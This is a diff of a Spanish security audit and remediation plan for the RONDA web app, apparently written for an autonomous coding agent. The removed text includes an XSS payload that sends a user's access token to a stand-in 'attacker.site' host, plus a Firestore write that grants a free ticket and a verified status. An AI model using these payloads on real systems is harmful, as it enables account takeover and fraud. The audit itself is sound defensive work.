@@ -1,261 +1,206 @@
-# 🛡️ AUDITORÍA INTEGRAL DE SEGURIDAD, ANÁLISIS DE VULNERABILIDADES, CÓDIGO DUPLICADO Y BUGS (RONDA)
+# Auditoría Forense Exhaustiva y Plan de Ejecución para Cline — RONDA v2.3.1
 
-> **Destinatario:** Cline (VS Code Agent / Ejecutor Autónomo) & Antigravity (Arquitecto)  
-> **Fecha de Emisión:** 26 de Octubre de 2026  
-> **Nivel de Severidad General:** 🔴 CRÍTICO / ALTO EN 3 VECTORES DE DATOS Y PRIVILEGIOS  
-> **Objetivo:** Documentar exhaustivamente cada vulnerabilidad de seguridad, fallo en reglas de base de datos, vectores de inyección XSS, colisiones de permisos, duplicación de código y bugs de runtime encontrados en la base de código de RONDA, proporcionando el plan paso a paso para que **Cline** ejecute las correcciones sin romper tests ni introducir costos de infraestructura ($0).
-
----
-
-## 1. 🚨 MATRIZ DE VULNERABILIDADES DE SEGURIDAD
-
-### 🔴 Hallazgo S-1: Escalada de Privilegios y Bypass Total de Pago / KYC en `firestore.rules` (Alta de Usuario)
-- **Severidad:** 🔴 CRÍTICA
-- **Ubicación:** [`firestore.rules:44-46`](file:///c:/Users/Cesar%20Dla%20Croix/Desktop/ronda-app/firestore.rules#L44-L46)
-- **Código Vulnerable:**
-  ```javascript
-  // Alta: solo el propio usuario, y SIEMPRE con rol 'client' (sin auto-elevación).
-  allow create: if request.auth != null
-                && request.auth.uid == userId
-                && request.resource.data.role == 'client';
-  ```
-- **Mecánica del Ataque:**
-  - La regla `allow create` **únicamente** comprueba que `request.resource.data.role == 'client'`.
-  - La función `clientTouchedSensitive()` (que restringe `trustTier`, `verifications`, `nfts`, `wallet_address`, `matches`) solo está activa en `allow update` (línea 54), **NO en `allow create`**.
-  - Tampoco se comprueba `hasTicket`.
-  - **Vector de Explotación:** Cualquier usuario al registrarse puede enviar a través del SDK de Firebase en consola del navegador:
-    ```javascript
-    setDoc(doc(db, 'users', auth.currentUser.uid), {
-      name: "Atacante",
-      role: "client",
-      hasTicket: true,          // <-- TICKET GRATIS A CUALQUIER EVENTO
-      trustTier: 2,             // <-- VERIFICACIÓN TIER 2 SIN KYC
-      isVerified: true,         // <-- STATUS VERIFICADO
-      nfts: ["fake_nft_id"],
-      matches: ["target_uid_1", "target_uid_2"] // <-- MATCHES FORZADOS
-    });
-    ```
-- **Remediación Inmediata (Cline):**
-  Modificar la regla `allow create` en [`firestore.rules`](file:///c:/Users/Cesar%20Dla%20Croix/Desktop/ronda-app/firestore.rules) para blindar todos los campos sensibles desde el instante de creación:
-  ```javascript
-  allow create: if request.auth != null
-                && request.auth.uid == userId
-                && request.resource.data.role == 'client'
-                && request.resource.data.get('hasTicket', false) == false
-                && request.resource.data.get('trustTier', 0) == 0
-                && request.resource.data.get('isVerified', false) == false
-                && !request.resource.data.keys().hasAny([
-                  'nfts', 'wallet_address', 'matches', 'verifications'
-                ]);
-  ```
+> **Fecha de Auditoría:** 2026-11-02  
+> **Arquitecto / Auditor:** Antigravity (Skills: `auditoria-ronda` + `project-security-auditor`)  
+> **Ejecutor Asignado:** Cline (VS Code Autonomous Agent)  
+> **Estado del Proyecto Base:** `v2.3.1-prod` (CRM v2 Fases F0–F3 completadas, `tsc --noEmit` 0 errores, `test:b2b` 19/19 OK)
 
 ---
 
-### 🔴 Hallazgo S-2: Bloqueo Total por Omisión en `firestore.rules` de la Colección `kycReviews`
-- **Severidad:** 🔴 CRÍTICA (Fallo Operativo y de Disponibilidad)
-- **Ubicación:** [`firestore.rules`](file:///c:/Users/Cesar%20Dla%20Croix/Desktop/ronda-app/firestore.rules) (Ausente) vs [`src/verification.ts:214`](file:///c:/Users/Cesar%20Dla%20Croix/Desktop/ronda-app/src/verification.ts#L214), [`src/kyc-review.ts:17`](file:///c:/Users/Cesar%20Dla%20Croix/Desktop/ronda-app/src/kyc-review.ts#L17) y [`src/superadmin.ts:337`](file:///c:/Users/Cesar%20Dla%20Croix/Desktop/ronda-app/src/superadmin.ts#L337).
-- **Mecánica:**
-  - En Firestore, cualquier colección no declarada explícitamente en `firestore.rules` tiene denegación por defecto (`deny all`).
-  - Cuando el módulo de verificación facial detecta un caso borde o fallo de OCR e intenta encolar en `kycReviews`, la llamada lanza `FirebaseError: Missing or insufficient permissions` y falla silenciosamente en el catch.
-  - El panel de SuperAdmin (`superadmin.ts`) tampoco puede consultar la cola de revisión manual.
-- **Remediación Inmediata (Cline):**
-  Agregar en [`firestore.rules`](file:///c:/Users/Cesar%20Dla%20Croix/Desktop/ronda-app/firestore.rules):
-  ```javascript
-  // --- Cola de Revisión Manual KYC ---
-  match /kycReviews/{reviewId} {
-    // Lectura: solo staff (superadmin / admin)
-    allow read: if request.auth != null && isStaff();
-    // Creación: el propio usuario autenticado registrando su caso borde
-    allow create: if request.auth != null 
-                  && request.resource.data.userId == request.auth.uid
-                  && request.resource.data.status == 'pending';
-    // Modificación / purga: solo staff
-    allow update, delete: if isStaff();
-  }
-  ```
+## 1. Resumen Ejecutivo y Matriz de Hallazgos Activos
+únicamente a tu UID maestro
+Tras auditar las reglas de Firestore (`firestore.rules`), headers y políticas de `firebase.json`, endpoints Serverless (`functions-vercel/api/*.js`), flujos de autenticación/autorización (`src/auth.ts`, `src/portal-auth.ts`, `src/db.ts`), biometría KYC (`src/verification.ts`, `src/kyc-review.ts`), consolas Staff (`src/superadmin.ts`, `src/network.ts`, `src/entry-network.ts`, `src/crm.ts`) y landings transaccionales (`partners.html`, `invest.html`), se identificaron **8 hallazgos activos** (4 Críticos `P0`, 3 Altos `P1`, 1 Medio `P2` con 4 sub-vectores):
+
+| ID | Severidad | Categoría | Archivo(s) y Líneas | Resumen del Problema |
+| :--- | :---: | :--- | :--- | :--- |
+| **P0-SEC-1** | 🔴 Crítico | Auth / Privilege Escalation | `firestore.rules:6-12` | `isMasterAdmin()` otorga rol `superadmin` a cualquier email `@ronda.uno` **sin verificar `email_verified == true`**. Permite crear cuentas con ese dominio en Firebase Auth y obtener permisos administrativos sobre Firestore. |
+| **P0-SEC-2** | 🔴 Crítico | Data Leak / PII Inversores | `firestore.rules:341-345`, `invest.html:2198` | `/invest_tokens/{tokenId}` tiene `allow read: if true` (`get` + `list`). Permite listar todos los tokens y PII (`name`, `phone`, `notes`, `ring`) de inversores FFF sin autenticación. |
+| **P0-SEC-3** | 🔴 Crítico | Flujo B2B Roto (`403`) | `firestore.rules:242-256`, `partners.html:2248`, `src/db.ts:878` | `partners.html` envía postulaciones de bares vía REST sin sesión (`status: 'lead'`, sin `sales_uid`), pero `firestore.rules:245` exige `request.auth != null && sales_uid == request.auth.uid`, bloqueando el 100% de leads entrantes de la landing B2B. |
+| **P0-SEC-4** | 🔴 Crítico | Flujo KYC / Perfil Roto | `src/verification.ts:224-240,836`, `src/db.ts:545-575,626`, `firestore.rules:57,294-298` | (A) `verification.ts` escribe `uid` y `status: 'approved'` en `kycReviews`, pero las reglas exigen `userId` y `status == 'pending'`. (B) `CLIENT_ALLOWED_USER_FIELDS` omite `emergencyContact`, `kycStatus` e `isPendingManualReview`, y `firestore.rules` bloquea `isVerified`, perdiendo la verificación y el contacto de emergencia al recargar. (C) Fallback `setDoc` en `db.ts:626` no filtra `fields`. |
+| **P1-SEC-5** | 🟠 Alto | Stored XSS en Consolas Staff | `src/superadmin.ts:764-886`, `src/network.ts:108-115`, `src/portal-auth.ts:439-440`, `src/entry-network.ts:198,223` | Interpolación en `innerHTML` sin `escapeHtml()` de nombres de usuarios, emails, teléfonos, bares y mensajes de error en paneles con sesión privilegiada (`superadmin`, `network`, `portal-auth`). |
+| **P1-SEC-6** | 🟠 Alto | Mass Assignment & Regla `/users` | `src/auth.ts:187-197`, `firestore.rules:67` | (A) En `registerWithEmail`, el spread `...profileData` va al final del objeto `User`, pudiendo sobrescribir `uid`, `role`, `isVerified`. (B) `DB.countUsers()` falla con `PERMISSION_DENIED` para clientes nuevos porque `/users` no permite agregación no-staff, rompiendo el Club Fundador 100. |
+| **P1-SEC-7** | 🟠 Alto | Integridad de Pagos y Web3 | `functions-vercel/api/wompi-webhook.js:58-115`, `functions-vercel/api/mint-nft.js:23,66-67` | (A) `wompi-webhook.js` no valida `tx.amount_in_cents` contra el precio real del evento (`events/{eventId}.price * 100`), no es idempotente y no limpia `paymentPending` en estado `VOIDED`. (B) `mint-nft.js` no verifica pertenencia de `venueId` para `admin` y genera un `txHash` falso con `Math.random()` si falta en el receipt. |
+| **P2-SEC-8** | 🟡 Medio | Hardening Reglas y Geolocalización | `firebase.json:31`, `firestore.rules:157-169,284-289,355` | (A) `firebase.json` tiene `Permissions-Policy: geolocation=()`, bloqueando el GPS del navegador en producción (`crm.html` y `verification.ts`). (B) `/stats/visits` permite sobrescribir arbitrariamente el contador. (C) `/waitlist` no acota tamaño de campos. (D) `/chats` permite alterar `participants` en `update`. |
 
 ---
 
-### 🔴 Hallazgo S-3: Colecciones B2B, Ledger y Tokens Bloqueadas en `firestore.rules`
-- **Severidad:** 🔴 CRÍTICA
-- **Ubicación:** [`firestore.rules`](file:///c:/Users/Cesar%20Dla%20Croix/Desktop/ronda-app/firestore.rules) (Ausentes) vs [`src/db.ts:720-840`](file:///c:/Users/Cesar%20Dla%20Croix/Desktop/ronda-app/src/db.ts#L720-L840) y [`src/superadmin.ts:1091`](file:///c:/Users/Cesar%20Dla%20Croix/Desktop/ronda-app/src/superadmin.ts#L1091).
-- **Colecciones sin Reglas Declaradas:**
-  - `scouts` (`DB.getScouts`, `DB.saveScout`)
-  - `hosts` (`DB.getHosts`, `DB.saveHost`)
-  - `commission_ledger` (`DB.getLedgerEntries`, `DB.saveLedgerEntry`)
-  - `payouts` (`DB.getPayouts`, `DB.savePayout`)
-  - `audit_logs` (`DB.logAudit`)
-  - `host_offers` (`DB.getHostOffers`, `DB.saveHostOffer`)
-  - `churn_surveys` (`DB.deleteUserAccount`)
-  - `invest_tokens` (`SuperAdmin.renderTokens`)
-- **Remediación Inmediata (Cline):**
-  Definir las reglas de acceso en [`firestore.rules`](file:///c:/Users/Cesar%20Dla%20Croix/Desktop/ronda-app/firestore.rules):
-  - `scouts` y `hosts`: lectura para staff o el propio scout/host; escritura para `isSuperAdmin() || isSales()`.
-  - `commission_ledger` y `payouts`: lectura para el payee correspondiente (`request.auth.uid == resource.data.payee_uid`) o staff; escritura únicamente `isSuperAdmin()`.
-  - `audit_logs`: creación para cualquier usuario autenticado registrando eventos de auditoría propios; lectura únicamente `isSuperAdmin()`.
-  - `host_offers`: lectura para el host invitado o staff; escritura `isSuperAdmin() || isSales()`.
-  - `churn_surveys`: creación pública para usuarios autenticados al suprimir cuenta; lectura solo `isSuperAdmin()`.
-  - `invest_tokens`: lectura pública o staff; escritura solo `isSuperAdmin()`.
+## 2. Plan de Ejecución Paso a Paso para Cline
+
+> **Instrucciones para Cline:**  
+> Ejecuta las siguientes **4 Fases** en orden estricto. Al finalizar cada fase, corre `npx tsc --noEmit` para asegurar 0 regresiones de tipos. Al concluir la Fase 4, ejecuta la batería completa de validación de la Sección 3.
 
 ---
 
-### 🟠 Hallazgo S-4: Inyección XSS Persistente (Stored XSS) en CRM y Consolas Staff
-- **Severidad:** 🟠 ALTA
-- **Ubicación:**
-  1. [`src/crm.ts:230-248`](file:///c:/Users/Cesar%20Dla%20Croix/Desktop/ronda-app/src/crm.ts#L230-L248): `card.innerHTML` interpola `lead.name`, `lead.zone`, `lead.contactName` y `lead.phone`.
-  2. [`src/profile.ts:114`](file:///c:/Users/Cesar%20Dla%20Croix/Desktop/ronda-app/src/profile.ts#L114): `profileMeta.innerHTML` interpola `cocktail`, `zone`, `zodiac`.
-  3. [`src/bar.ts:590`](file:///c:/Users/Cesar%20Dla%20Croix/Desktop/ronda-app/src/bar.ts#L590): `el.innerHTML` interpola `p.name || uid`.
-  4. [`src/notifications.ts:125-126`](file:///c:/Users/Cesar%20Dla%20Croix/Desktop/ronda-app/src/notifications.ts#L125-L126): `this.list.innerHTML` interpola `n.title` y `n.body`.
-- **Mecánica del Ataque:**
-  - El formulario público B2B en `partners.html` (`#partner-lead-form`) permite a cualquier visitante de internet registrar un lead.
-  - Si el atacante introduce:
-    ```html
-    <img src=x onerror="fetch('https://attacker.site/steal?token='+window.Auth.currentUser.accessToken)">
-    ```
-    como nombre del local o nombre de contacto, dicho payload se guarda en Firestore (`leads`).
-  - Cuando el equipo comercial o el superadmin ingresa a `crm.html`, el payload se inserta directamente en el DOM mediante `innerHTML`. El script malicioso se ejecuta con los privilegios del staff.
-- **Remediación Inmediata (Cline):**
-  Exportar y utilizar transversalmente una función `escapeHtml` desde un módulo utilitario común (`src/dialog.ts` o un nuevo `src/utils.ts`):
-  ```typescript
-  export function escapeHtml(str: string | null | undefined): string {
-    if (!str) return '';
-    return String(str)
-      .replace(/&/g, '&amp;')
-      .replace(/</g, '&lt;')
-      .replace(/>/g, '&gt;')
-      .replace(/"/g, '&quot;')
-      .replace(/'/g, '&#39;');
-  }
-  ```
-  Reemplazar todas las interpolaciones vulnerables en `crm.ts`, `profile.ts`, `bar.ts` y `notifications.ts`.
+### FASE 1: Blindaje de Reglas de Firestore y Headers de Producción (`P0-SEC-1`, `P0-SEC-2`, `P0-SEC-3`, `P2-SEC-8`)
+
+#### Tarea 1.1 — Exigir `email_verified` en `isMasterAdmin()` y restringir a UID maestro y `cesar@ronda.uno` (`firestore.rules:6-12`)
+En `firestore.rules`, actualiza `isMasterAdmin()` para restringir el acceso SuperAdmin de emergencia **exclusivamente** al UID maestro o a `cesar@ronda.uno` con verificación de correo confirmada:
+
+```javascript
+    // SuperAdmin de Emergencia: Exclusivo UID maestro o cesar@ronda.uno verificado
+    function isMasterAdmin() {
+      return isSignedIn() && (
+        request.auth.uid == 'hVX2RL2xJhRFurJJsAgdyVIaDT53' ||
+        (
+          request.auth.token.email_verified == true &&
+          request.auth.token.email == 'cesar@ronda.uno'
+        )
+      );
+    }
+```
+
+#### Tarea 1.2 — Impedir listado público de `/invest_tokens` (`firestore.rules:341-345`)
+En `firestore.rules`, separa `read` en `get` (para validar un código puntual en `invest.html`) y `list` (exclusivo para `isSuperAdmin()`):
+
+```javascript
+    match /invest_tokens/{tokenId} {
+      allow get: if true;
+      allow list: if isSuperAdmin();
+      allow create, update, delete: if isSuperAdmin();
+    }
+```
+
+#### Tarea 1.3 — Habilitar ingesta segura de Leads B2B desde `partners.html` (`firestore.rules:242-256`, `partners.html:2248`, `src/db.ts:878`)
+1. En `firestore.rules`, dentro de `match /leads/{leadId}`, permite la creación de postulaciones entrantes desde `partners.html` bajo un esquema estricto y permite a los Scouts leer/reclamar leads `unassigned`:
+```javascript
+    match /leads/{leadId} {
+      allow read: if isSuperAdmin() || isAdmin() || (
+        isSales() && (
+          resource.data.sales_uid == request.auth.uid ||
+          resource.data.scout_uid == request.auth.uid ||
+          resource.data.sales_uid == 'unassigned'
+        )
+      );
+      allow create: if (
+        (isSales() || isSuperAdmin() || isAdmin()) &&
+        request.resource.data.sales_uid == request.auth.uid &&
+        request.resource.data.name is string &&
+        request.resource.data.name.size() > 0 &&
+        request.resource.data.name.size() <= 150
+      ) || (
+        // Ingesta pública acotada desde partners.html (postulación de bares B2B)
+        request.resource.data.keys().hasOnly(['id', 'name', 'zone', 'phone', 'status', 'source', 'notes', 'createdAt', 'sales_uid']) &&
+        request.resource.data.status == 'lead' &&
+        request.resource.data.sales_uid == 'unassigned' &&
+        request.resource.data.name is string && request.resource.data.name.size() > 0 && request.resource.data.name.size() <= 150 &&
+        request.resource.data.zone is string && request.resource.data.zone.size() <= 80 &&
+        request.resource.data.phone is string && request.resource.data.phone.size() <= 40 &&
+        request.resource.data.source in ['Desde Calculadora', 'Formulario Directo', 'Landing B2B'] &&
+        request.resource.data.notes is string && request.resource.data.notes.size() <= 1000
+      );
+      allow update: if isSuperAdmin() || isAdmin() || (
+        isSales() && (
+          resource.data.sales_uid == request.auth.uid ||
+          resource.data.scout_uid == request.auth.uid ||
+          (resource.data.sales_uid == 'unassigned' && request.resource.data.sales_uid == request.auth.uid)
+        )
+      );
+      allow delete: if isSuperAdmin();
+    }
+```
+2. En `partners.html` (alrededor de la línea 2258), agrega `sales_uid: { stringValue: 'unassigned' }` al payload `fields` enviado a `/documents/leads`.
+
+#### Tarea 1.4 — Hardening de `/chats`, `/waitlist`, `/stats/visits` y `Permissions-Policy` (`firestore.rules`, `firebase.json`)
+1. En `firestore.rules` (`match /chats/{chatId}`):
+   - En `allow create`: exige `request.resource.data.participants is list && request.resource.data.participants.size() == 2 && request.auth.uid in request.resource.data.participants`.
+   - En `allow update`: exige `!request.resource.data.diff(resource.data).affectedKeys().hasAny(['participants', 'id', 'eventId', 'createdAt'])`.
+2. En `firestore.rules` (`match /waitlist/{entryId}`):
+   - Exige `request.resource.data.keys().size() <= 12 && request.resource.data.name.size() <= 120 && request.resource.data.email.size() <= 150`.
+3. En `firestore.rules` (`match /stats/{statId}`):
+   - En `allow create`: exige `statId == 'visits' && request.resource.data.keys().hasOnly(['count']) && request.resource.data.count == 1`.
+   - En `allow update`: exige `statId == 'visits' && request.resource.data.keys().hasOnly(['count']) && request.resource.data.count == resource.data.count + 1`.
+4. En `firebase.json` (línea 31):
+   - Cambia `"value": "camera=(self), microphone=(self), geolocation=()"` por `"value": "camera=(self), microphone=(self), geolocation=(self)"` para no bloquear el GPS en `/crm.html` ni en `Verification.requestLocation()`.
 
 ---
 
-### 🟠 Hallazgo S-5: Falta de Validación de Firma en Webhook de WhatsApp y Token Hardcodeado
-- **Severidad:** 🟠 ALTA
-- **Ubicación:** [`functions-vercel/api/whatsapp-webhook.js:13, 28-36`](file:///c:/Users/Cesar%20Dla%20Croix/Desktop/ronda-app/functions-vercel/api/whatsapp-webhook.js#L13)
-- **Código Vulnerable:**
-  ```javascript
-  const verifyToken = process.env.WHATSAPP_VERIFY_TOKEN || 'ronda_webhook_secret_2026';
-  ...
-  if (req.method === 'POST') {
-    const body = req.body;
-    if (!body || body.object !== 'whatsapp_business_account') ...
-    // NO HAY VERIFICACIÓN DE X-Hub-Signature-256
-  ```
-- **Mecánica:**
-  - En peticiones POST entrantes, Meta firma el payload con HMAC-SHA256 en la cabecera `X-Hub-Signature-256`.
-  - La función en Vercel omite por completo esta verificación.
-  - Cualquier actor externo puede enviar peticiones HTTP POST falsas simulando mensajes de WhatsApp e inyectar registros en la base de datos `whatsapp_inbound`.
-- **Remediación Inmediata (Cline):**
-  - Eliminar el fallback inseguro `'ronda_webhook_secret_2026'`. Si no hay variable de entorno, fallar cerrado (500).
-  - En el handler POST, calcular el HMAC-SHA256 del raw body usando `process.env.WHATSAPP_APP_SECRET` y comparar con `req.headers['x-hub-signature-256']`.
+### FASE 2: Reparación del Flujo KYC, Perfil de Usuario y Registro (`P0-SEC-4`, `P1-SEC-6`)
+
+#### Tarea 2.1 — Alinear esquema de `kycReviews` y persistencia de `kycStatus` / `emergencyContact` (`src/verification.ts`, `src/db.ts`, `firestore.rules`)
+1. En `src/verification.ts`:
+   - En `submitManualKycReview` (línea 224) y en el flujo de revisión de documento (línea 827): incluye siempre `userId: user.uid` además de `uid: user.uid`, y usa `status: 'pending'` al crear el documento en `kycReviews` desde el cliente (o invoca `POST /api/verify-kyc` con el Bearer token del usuario cuando la biometría automática apruebe el rostro para que el Admin SDK marque `isVerified: true` de forma segura).
+2. En `src/db.ts` (`CLIENT_ALLOWED_USER_FIELDS`, líneas 545–575):
+   - Añade `'emergencyContact'`, `'kycStatus'` e `'isPendingManualReview'` a `CLIENT_ALLOWED_USER_FIELDS`.
+   - En el bloque `catch` de `DB.updateUserProfile` (línea 626), reemplaza `...fields` por `...safeFields` para impedir que el fallback `setDoc` escriba campos prohibidos como `role` o `isVerified`.
+3. En `firestore.rules` (`match /users/{userId}`, líneas 53–64):
+   - Permite que el propio usuario actualice `kycStatus` únicamente a `'pending'` (nunca a `'verified'` directamente desde cliente) y asegura que `/api/verify-kyc` sea quien escriba `isVerified: true` y `kycStatus: 'verified'`.
+
+#### Tarea 2.2 — Prevenir Mass Assignment en `AuthService.registerWithEmail` y corregir Club Fundador 100 (`src/auth.ts:171-200`)
+1. En `src/auth.ts` (`registerWithEmail`, línea 180):
+   - Coloca `...profileData` **antes** de los campos de seguridad fijos para que nunca pueda sobrescribir `uid`, `role`, `isVerified`, `strikes` ni `noShowCount`:
+   ```typescript
+   const newProfile: User = {
+       ...profileData,
+       uid: cred.user.uid,
+       role: 'client',
+       name,
+       email,
+       phoneNumber: phone,
+       gender,
+       age,
+       locality,
+       avatar: gender === 'M' ? '🧔🏻' : '👩🏻',
+       verificationStatus: true,
+       isVerified: false,
+   };
+   ```
+2. En `src/auth.ts` (línea 193):
+   - Envuelve `DB.countUsers()` en un `try/catch` silencioso o lee un contador público en `/stats/founders` para que el fallo de permisos de `getCountFromServer(collection(db, 'users'))` no arroje errores en consola durante el registro.
 
 ---
 
-### 🟡 Hallazgo S-6: Transacciones Rechazadas o Expiradas de Wompi Dejan `paymentPending` Bloqueado
-- **Severidad:** 🟡 MEDIA
-- **Ubicación:** [`functions-vercel/api/wompi-webhook.js:57-109`](file:///c:/Users/Cesar%20Dla%20Croix/Desktop/ronda-app/functions-vercel/api/wompi-webhook.js#L57-L109)
-- **Mecánica:**
-  - El webhook solo maneja `if (status === 'APPROVED')`.
-  - Si la transacción es `DECLINED`, `VOIDED` o `ERROR`, no se ejecuta ninguna acción sobre el usuario.
-  - El usuario queda con `paymentPending: true` en su perfil de Firestore, impidiéndole generar nuevas órdenes o reintentar el pago de forma limpia.
-- **Remediación Inmediata (Cline):**
-  Añadir el manejo de fallos para desbloquear la sesión de compra:
-  ```javascript
-  else if (['DECLINED', 'VOIDED', 'ERROR'].includes(status)) {
-    await db.collection('users').doc(uid).update({
-      paymentPending: false,
-      lastPaymentError: status
-    });
-  }
-  ```
+### FASE 3: Sanitización Anti-XSS en Consolas Operativas (`P1-SEC-5`)
+
+#### Tarea 3.1 — Sanitizar `src/superadmin.ts` (`renderEventsSection` y `renderBookingsSection`)
+1. Importa `escapeHtml` desde `./utils` al inicio de `src/superadmin.ts`.
+2. En `renderEventsSection` (líneas 760–815), aplica `escapeHtml()` a `e.name`, `e.venueName`, `e.dayDate`, `e.time` y `e.locality`.
+3. En `renderBookingsSection` (líneas 860–886), aplica `escapeHtml()` a `b.user.name`, `b.user.email`, `b.user.phoneNumber`, `b.reservation.venueName`, `b.reservation.dayDate` y `b.reservation.eventId`.
+
+#### Tarea 3.2 — Sanitizar `src/network.ts`, `src/entry-network.ts` y `src/portal-auth.ts`
+1. En `src/network.ts` (líneas 108–115): envuelve `v.name`, `v.zone`, `v.address` y `conflicts[0].conflictingVenueName` con `escapeHtml(...)`.
+2. En `src/entry-network.ts` (líneas 198 y 223): importa `escapeHtml` de `./utils` y sanitiza `message` y `errorText` antes de inyectarlos en `innerHTML`.
+3. En `src/portal-auth.ts` (líneas 439–440): importa `escapeHtml` de `./utils` y sanitiza `user.name || user.email || user.uid` y `user.role` en `injectPortalHeaderBar`.
 
 ---
 
-### 🟡 Hallazgo S-7: Creación Irrestricta de Chats Efímeros sin Match Mutuo
-- **Severidad:** 🟡 MEDIA
-- **Ubicación:** [`firestore.rules:105-110`](file:///c:/Users/Cesar%20Dla%20Croix/Desktop/ronda-app/firestore.rules#L105-L110)
-- **Mecánica:**
-  - La regla permite crear documentos en `/chats/{chatId}` si el usuario está en `participants` y no ha expirado.
-  - No valida que los participantes tengan un match mutuo confirmado en sus perfiles (`users/{uid}/matches`).
-  - Un usuario malicioso podría abrir conversaciones con personas que no hicieron match o no asistieron al evento.
-- **Remediación Inmediata (Cline):**
-  Verificar que `request.auth.uid` y el otro participante tengan coincidencia en Firestore o restringir la creación de chats exclusivamente al backend/staff (`isStaff()`).
+### FASE 4: Integridad de Webhooks de Pago y Endpoints Web3 (`P1-SEC-7`)
+
+#### Tarea 4.1 — Validar precio del evento e idempotencia en `functions-vercel/api/wompi-webhook.js`
+1. En `functions-vercel/api/wompi-webhook.js` (líneas 65–95):
+   - Lee el documento `events/{eventId}` antes de confirmar la reserva.
+   - Verifica que `tx.amount_in_cents >= Math.round(Number(eventData.price || 0) * 100)` y `tx.currency === 'COP'`. Si el monto pagado es menor al precio oficial del evento, registra una alerta en `payment_alerts` y rechaza la activación del ticket.
+   - Verifica idempotencia: si `user.reservations` ya contiene una reserva con `wompiTransactionId === tx.id` y `status === 'confirmed'`, responde `200 OK` sin duplicar cupos (`eventCapacity.${eventId}`).
+   - En la línea 109, incluye `tx.status === 'VOIDED'` junto a `'DECLINED'` y `'ERROR'` para limpiar `paymentPending`.
+
+#### Tarea 4.2 — Autorización por `venueId` y eliminación de `txHash` falso en `functions-vercel/api/mint-nft.js`
+1. En `functions-vercel/api/mint-nft.js`:
+   - Si `caller.role === 'admin'`, verifica que `eventData.venueId === caller.venueId` antes de permitir el minting.
+   - Elimina el fallback `0x${Array.from({length: 64}, () => Math.floor(Math.random()*16).toString(16)).join('')}` (líneas 66–67). Usa `receipt.hash || receipt.transactionHash` y, si no existe, lanza un error explícito `502 Bad Gateway` en lugar de persistir un hash falso en Firestore.
 
 ---
 
-## 2. 🔄 CÓDIGO DUPLICADO Y REDUNDANCIAS ARQUITECTÓNICAS
+## 3. Protocolo de Verificación Obligatorio (Post-Ejecución Cline)
 
-| Componente | Archivo 1 | Archivo 2 / 3 | Problema Detectado | Acción para Cline |
-| :--- | :--- | :--- | :--- | :--- |
-| **Estilos Globales de Tokens** | [`assets/ronda-tokens.css`](file:///c:/Users/Cesar%20Dla%20Croix/Desktop/ronda-app/assets/ronda-tokens.css) | [`public/assets/ronda-tokens.css`](file:///c:/Users/Cesar%20Dla%20Croix/Desktop/ronda-app/public/assets/ronda-tokens.css) | Duplicación exacta de 4.3 KB. Al editar uno, el otro queda desincronizado. | Unificar mediante script de copia en `scripts/sync-version.cjs` o mantener `public/assets/` como única SSoT servida por Vite. |
-| **Componente RondaDialog** | [`assets/ronda-dialog.js`](file:///c:/Users/Cesar%20Dla%20Croix/Desktop/ronda-app/assets/ronda-dialog.js) | [`src/dialog.ts`](file:///c:/Users/Cesar%20Dla%20Croix/Desktop/ronda-app/src/dialog.ts) | Dos implementaciones paralelas del modal luxury (una en JS para HTML legacy y otra en TS compilada). | Exportar e incluir `dist/assets/ronda-dialog.js` generado automáticamente por el build o asegurar paridad en `scripts/build-prod.cjs`. |
-| **Sanitización HTML** | [`src/dialog.ts:13`](file:///c:/Users/Cesar%20Dla%20Croix/Desktop/ronda-app/src/dialog.ts#L13) | Ausente en `crm.ts`, `profile.ts`, `bar.ts`, `notifications.ts` | Solo `dialog.ts` contiene `escapeHtml()`; el resto del código concatena strings raw. | Extraer `escapeHtml` a `src/utils.ts` y reutilizarla en todos los módulos. |
-| **Lógica de Roles en Rules** | [`firestore.rules:10-14`](file:///c:/Users/Cesar%20Dla%20Croix/Desktop/ronda-app/firestore.rules#L10-L14) | Múltiples funciones | `isStaff()` evalúa 4 funciones que llaman independientemente a `userRole()`, disparando múltiples lecturas `get()`. | Agrupar en: `function isStaff() { let r = userRole(request.auth.uid); return r in ['superadmin', 'sales', 'network', 'admin']; }`. |
+Una vez aplicadas las 4 fases, Cline debe ejecutar en orden:
 
----
-
-## 3. 🐛 BUGS DE RUNTIME, FUGAS Y CASOS BORDE
-
-### 🐞 Bug B-1: Fuga de Event Listeners en `src/bar.ts` (`btnLogout`)
-- **Ubicación:** [`src/bar.ts:488-493`](file:///c:/Users/Cesar%20Dla%20Croix/Desktop/ronda-app/src/bar.ts#L488-L493)
-- **Detalle:** En `renderDashboard()`, los botones `btnStart`, `btnEnd`, `btnCapacity`, `btnMenu` se limpian mediante `cloneNode(true)`. Sin embargo, `btnLogout` agrega un nuevo `addEventListener('click')` cada vez que llega una actualización de Firestore en tiempo real. Tras 5 actualizaciones, pulsar "Cerrar Sesión" dispara 5 cierres de sesión concurrentes.
-- **Fix:** Aplicar `cloneNode(true)` a `btnLogout` antes de vincular el evento.
-
-### 🐞 Bug B-2: Mensajes de Error `[object Object]` en `src/api-client.ts`
-- **Ubicación:** [`src/api-client.ts:48`](file:///c:/Users/Cesar%20Dla%20Croix/Desktop/ronda-app/src/api-client.ts#L48)
-- **Detalle:** `throw new Error(responseData.error || responseData.message || ...);`  
-  Dado que las funciones de Vercel devuelven `{ error: { message: "...", code: "..." } }`, `responseData.error` es un objeto, lo que provoca que `new Error(...)` muestre `[object Object]` en lugar del texto del error.
-- **Fix:** Cambiar a `responseData.error?.message || responseData.error || responseData.message || ...`.
-
-### 🐞 Bug B-3: Inconsistencia de Narrativa en `src/bar.ts` (2 Cócteles vs 1 Cóctel de Autor)
-- **Ubicación:** [`src/bar.ts:435-442`](file:///c:/Users/Cesar%20Dla%20Croix/Desktop/ronda-app/src/bar.ts#L435-L442)
-- **Detalle:** El anfitrión sigue viendo `${totalParticipants * 2} mínimo` y `totalRev = totalParticipants * 44000` ($22.000 × 2), contradiciendo el hito global de estandarización donde la entrada incluye únicamente **1 Cóctel de Autor** ($22.000 COP).
-- **Fix:** Cambiar a `${totalParticipants} cóctel de autor incluido` y `totalRev = totalParticipants * 22000`.
-
-### 🐞 Bug B-4: Elemento no Editable en `promptMenuNight` (`src/bar.ts`)
-- **Ubicación:** [`src/bar.ts:545, 556-557`](file:///c:/Users/Cesar%20Dla%20Croix/Desktop/ronda-app/src/bar.ts#L545)
-- **Detalle:** `#menu-night-price` es un `<span>`, no un `<input>`. El anfitrión no puede modificar el precio en pantalla y la función re-guarda el mismo valor inicial.
-- **Fix:** Convertir `#menu-night-price` en un input numérico estilizado `<input id="menu-night-price" type="number" value="${this.currentEvent.price ?? 45000}">` y leer su valor (`.value`).
-
----
-
